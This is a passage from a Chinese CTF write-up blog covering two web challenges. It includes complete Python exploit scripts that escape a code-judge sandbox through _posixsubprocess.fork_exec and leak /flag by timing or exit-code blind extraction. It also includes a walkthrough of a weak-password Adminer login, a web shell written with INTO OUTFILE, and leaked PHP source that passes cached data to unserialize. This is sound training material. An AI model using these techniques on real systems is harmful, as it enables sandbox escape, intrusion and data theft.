     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/ddd1f4a67ca34589b55e2d9775b1ca98.png">
      然后就尝试跑一下看看
      <code>
       /flag
      </code>
      的情况
     </img>
    </p>
    <pre><code class="prism language-python"><span class="token keyword">import</span> _posixsubprocess
<span class="token keyword">import</span> os
command <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""
if [ $(head -c1 /flag | od -An -t u1) -eq 97 ]; then
    sleep 5
fi
"""</span>
_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">False</span>
<span class="token punctuation">)</span>

</code></pre>
    <p>
     试了好多次都发现没有用, 所以我当时就以为是不存在
     <code>
      /flag
     </code>
     这个文件, 它应该是改了名字所以就没做下去了
     <br/>
     看完wp后发现还可以用通配符来着, 当时给忘了, 有点蠢了
    </p>
    <p>
     来自星盟团队的wp
    </p>
    <pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> Timeout

<span class="token comment"># 配置常量</span>
TARGET_URL <span class="token operator">=</span> <span class="token string">"url/api/submit"</span>
HEADERS <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">}</span>
TIMEOUT_LIMIT <span class="token operator">=</span> <span class="token number">5</span>
CHAR_SET <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890{}-"</span>
SLEEP_DURATION <span class="token operator">=</span> <span class="token number">10</span>  <span class="token comment"># 用于触发超时的睡眠时间</span>

<span class="token keyword">class</span> <span class="token class-name">FlagBruteforcer</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token string">""</span>
    
    <span class="token keyword">def</span> <span class="token function">_generate_payload</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> char<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""构造盲注payload"""</span>
        position <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>
            <span class="token string-interpolation"><span class="token string">f"if [ $(cat /f* | cut -c </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>position<span class="token punctuation">}</span></span><span class="token string">) = '</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>char<span class="token punctuation">}</span></span><span class="token string">' ]; "</span></span>
            <span class="token string-interpolation"><span class="token string">f"then sleep </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>SLEEP_DURATION<span class="token punctuation">}</span></span><span class="token string">; fi"</span></span>
        <span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">_build_exploit_code</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""构造包含payload的请求体"""</span>
        <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"""import os
import _posixsubprocess
_posixsubprocess.fork_exec(
    [b"/bin/bash", b"-c", b"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>payload<span class="token punctuation">}</span></span><span class="token string">"],
    [b"/bin/bash"],
    True,
    (), None, None, -1, -1, -1, -1, -1, -1, *os.pipe(),
    False, False, False, None, None, None, -1, None, False
)
input_str = input()
a, b = map(int, input_str.split())
print(a - b)"""</span></span><span class="token punctuation">,</span>
            <span class="token string">"problem_id"</span><span class="token punctuation">:</span> <span class="token string">"0"</span>
        <span class="token punctuation">}</span>
    
    <span class="token keyword">def</span> <span class="token function">_test_character</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> char<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""测试单个字符并返回是否触发超时"""</span>
        payload <span class="token operator">=</span> self<span class="token punctuation">.</span>_generate_payload<span class="token punctuation">(</span>char<span class="token punctuation">)</span>
        json_data <span class="token operator">=</span> self<span class="token punctuation">.</span>_build_exploit_code<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
                TARGET_URL<span class="token punctuation">,</span>
                headers<span class="token operator">=</span>HEADERS<span class="token punctuation">,</span>
                json<span class="token operator">=</span>json_data<span class="token punctuation">,</span>
                timeout<span class="token operator">=</span>TIMEOUT_LIMIT
            <span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Response: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>response<span class="token punctuation">.</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        <span class="token keyword">except</span> Timeout<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
    
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""主爆破逻辑"""</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            found <span class="token operator">=</span> <span class="token boolean">False</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Current progress: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>self<span class="token punctuation">.</span>flag<span class="token punctuation">}</span></span><span class="token string">|"</span></span><span class="token punctuation">)</span>
            
            <span class="token keyword">for</span> char <span class="token keyword">in</span> CHAR_SET<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Testing: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>self<span class="token punctuation">.</span>flag<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>char<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>_test_character<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>flag <span class="token operator">+=</span> char
                    found <span class="token operator">=</span> <span class="token boolean">True</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"MATCH! Current flag: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>self<span class="token punctuation">.</span>flag<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                    <span class="token keyword">break</span>
            
            <span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"flag: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>self<span class="token punctuation">.</span>flag<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    bruteforcer <span class="token operator">=</span> FlagBruteforcer<span class="token punctuation">(</span><span class="token punctuation">)</span>
    bruteforcer<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     来自官方的wp:
    </p>
    <pre><code class="prism language-python"><span class="token keyword">import</span> requests

URL <span class="token operator">=</span> <span class="token string">"http://121.41.238.106:59529/api/submit"</span>
CODE_TEMPLATE <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
import _posixsubprocess
import os
import time
import sys

std_pipe = os.pipe()
err_pipe = os.pipe()

_posixsubprocess.fork_exec(
    (b"/bin/bash", b"-c", b"ls /"),
    [b"/bin/bash"],
    True,
    (),
    None,
    None,
    -1,
    -1,
    -1,
    std_pipe[1],  # c2pwrite
    -1,
    -1,
    *(err_pipe),
    False,
    False,
    False,
    None,
    None,
    None,
    -1,
    None,
    False,
)

time.sleep(0.1)
content = os.read(std_pipe[0], 1024)
content_len = len(content)

if {loc} &lt; content_len:
    sys.exit(content[{loc}])
else:
    sys.exit(255)
"""</span>

command <span class="token operator">=</span> <span class="token string">"ls /"</span>
received <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    code <span class="token operator">=</span> CODE_TEMPLATE<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>loc<span class="token operator">=</span>i<span class="token punctuation">,</span> command<span class="token operator">=</span>command<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"problem_id"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"code"</span><span class="token punctuation">:</span> code<span class="token punctuation">}</span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span>
    resp_data <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> resp_data<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"RE"</span>

    ret_loc <span class="token operator">=</span> resp_data<span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"ret="</span><span class="token punctuation">)</span>
    ret_code <span class="token operator">=</span> resp_data<span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span><span class="token punctuation">[</span>ret_loc <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> ret_code <span class="token operator">==</span> <span class="token string">"255"</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

    received <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ret_code<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>received<span class="token punctuation">)</span>
</code></pre>
    <h3>
     <a id="OK_430">
     </a>
     打卡OK
    </h3>
    <blockquote>
     <p>
      没写好的系统怎么会打卡ok呢~
     </p>
    </blockquote>
    <p>
     访问题目给的地址就自动跳转到了一个登录页面
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/c520328a6a224dadad97b9b589084446.png">
      不太可能会是弱口令能登录进去的, code也不知道是啥
      <br/>
      用dirsearch扫描一下
      <br/>
      可以发现一个
      <code>
       /adminer_481.php
      </code>
      路由
      <br/>
      (开始字典里面没有这个, 看完wp后手动加上去的,嘿嘿)
      <br/>
      <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/3f56367baf824aee8be038d09f69fc0a.png"/>
     </img>
    </p>
    <p>
     访问这个路由可以发现是一个数据库的登录页面
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/3c789777c1774c4d84fa9d4226527c81.png"/>
    </p>
    <p>
     直接弱口令 root / root 可以登录进去
     <br/>
     可以执行sql语句, 利用
     <code>
      into outfile
     </code>
     写入shell到网站上去
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/b1aeccfae42b402992cc835b894ea0d4.png"/>
    </p>
    <p>
     访问写入的shell.php , 执行命令拿到flag
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/918599ec1e23460aa12a876638a3ffc1.png"/>
    </p>
    <p>
     这道题目在用dirsearch扫描的时候可以扫到一个
     <code>
      index.php~
     </code>
     , 访问之后可以看到源码, 就可以基于这个尝试
     <code>
      login.php~
     </code>
     发现也可以拿到源码, 里面有数据库的账号密码
     <br/>
     然后读一下index.php
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert(\\"</span>Please login<span class="token operator">!</span>\\<span class="token string double-quoted-string">");window.location.href=\\"</span><span class="token operator">.</span><span class="token operator">/</span>login<span class="token operator">.</span>php\\<span class="token string double-quoted-string">";&lt;/script&gt;"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">!</span>doctype html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string double-quoted-string">"en"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>鎵撳崱绯荤粺<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"keywords"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"HTML5 Template"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"description"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"Forum - Responsive HTML5 Template"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"author"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"Forum"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>link rel<span class="token operator">=</span><span class="token string double-quoted-string">"shortcut icon"</span> href<span class="token operator">=</span><span class="token string double-quoted-string">"favicon/favicon.ico"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"format-detection"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"telephone=no"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"viewport"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>link rel<span class="token operator">=</span><span class="token string double-quoted-string">"stylesheet"</span> href<span class="token operator">=</span><span class="token string double-quoted-string">"css/style.css"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> tt<span class="token operator">-</span>mobile menu <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>nav <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"panel-menu"</span> id<span class="token operator">=</span><span class="token string double-quoted-string">"mobile-menu"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>ul<span class="token operator">&gt;</span>

    <span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"mm-navbtn-names"</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"mm-closebtn"</span><span class="token operator">&gt;</span>
            Close
            <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"tt-icon"</span><span class="token operator">&gt;</span>
                <span class="token operator">&lt;</span>svg<span class="token operator">&gt;</span>
                  <span class="token operator">&lt;</span><span class="token keyword">use</span> <span class="token package">xlink</span><span class="token punctuation">:</span>href<span class="token operator">=</span><span class="token string double-quoted-string">"#icon-cancel"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">use</span><span class="token operator">&gt;</span>
                <span class="token operator">&lt;</span><span class="token operator">/</span>svg<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"mm-backbtn"</span><span class="token operator">&gt;</span>Back<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>nav<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>main id<span class="token operator">=</span><span class="token string double-quoted-string">"tt-pageContent"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"container"</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"tt-wrapper-inner"</span><span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>h1 <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"tt-title-border"</span><span class="token operator">&gt;</span>
                琛ュ崱绯荤粺
            <span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>form <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"form-default form-create-topic"</span> action<span class="token operator">=</span><span class="token string double-quoted-string">"./index.php"</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"POST"</span><span class="token operator">&gt;</span>
                <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"form-group"</span><span class="token operator">&gt;</span>
                    <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string double-quoted-string">"inputTopicTitle"</span><span class="token operator">&gt;</span>濮撳悕<span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>
                    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"tt-value-wrapper"</span><span class="token operator">&gt;</span>
                        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"text"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"username"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"form-control"</span> id<span class="token operator">=</span><span class="token string double-quoted-string">"inputTopicTitle"</span> placeholder<span class="token operator">=</span><span class="token string double-quoted-string">"&lt;?php echo <span class="token interpolation"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span></span>;?&gt;"</span><span class="token operator">&gt;</span>
                    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
                    
                <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>

                <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"pt-editor"</span><span class="token operator">&gt;</span>
                    <span class="token operator">&lt;</span>h6 <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"pt-title"</span><span class="token operator">&gt;</span>琛ュ崱鍘熷洜<span class="token operator">&lt;</span><span class="token operator">/</span>h6<span class="token operator">&gt;</span>
                    
                    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"form-group"</span><span class="token operator">&gt;</span>
                        <span class="token operator">&lt;</span>textarea name<span class="token operator">=</span><span class="token string double-quoted-string">"reason"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"form-control"</span> rows<span class="token operator">=</span><span class="token string double-quoted-string">"5"</span> placeholder<span class="token operator">=</span><span class="token string double-quoted-string">"Lets get started"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>textarea<span class="token operator">&gt;</span>
                    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
                    
                     <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"row"</span><span class="token operator">&gt;</span>
                        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"col-auto ml-md-auto"</span><span class="token operator">&gt;</span>
                            <span class="token operator">&lt;</span>button <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"btn btn-secondary btn-width-lg"</span><span class="token operator">&gt;</span>鎻愪氦<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
                        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
                    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
                <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
       
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>main<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token keyword">include</span> <span class="token string single-quoted-string">'./cache.php'</span><span class="token punctuation">;</span>
<span class="token variable">$check</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">checkin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reason'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debug_buka'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debug_buka'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d H:i:s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$arraya</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"name"</span><span class="token operator">=&gt;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"reason"</span><span class="token operator">=&gt;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reason'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"time"</span><span class="token operator">=&gt;</span><span class="token variable">$time</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"background"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$check</span><span class="token operator">-&gt;</span><span class="token function">writec</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'-'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$arraya</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'check'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$cachefile</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/cache/'</span> <span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'-'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$cachefile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$cachefile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$checkdata</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php exit;//"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
